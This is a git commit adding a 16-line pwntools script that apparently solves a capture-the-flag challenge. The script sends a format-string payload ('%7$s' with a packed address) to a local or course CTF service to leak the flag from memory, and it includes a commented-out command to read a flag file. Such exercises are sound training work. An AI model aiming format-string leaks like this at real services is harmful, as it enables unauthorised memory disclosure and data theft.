19cff30284178eb0f6973f7ff082da45d26a0d90
k123321141 <kk123321141@gmail.com>
2017-10-13 13:40:09 +0800

    finish cr4ck

---
+++ 10:13/script_cr4ck.py
@@ -0,0 +1,16 @@
+from pwn import *
+
+context.arch = 'amd64'
+
+r = remote('127.0.0.1',8888)
+#r = remote('csie.ctf.tw',10131)
+
+r.recvuntil('?')
+
+
+flag_addr = 0x4007b4
+format_str = '%7$s.aaa' + p64(flag_addr)
+r.send(format_str)
+#r.sendline'cat ./home/ret2plt/flag')
+r.interactive()
+
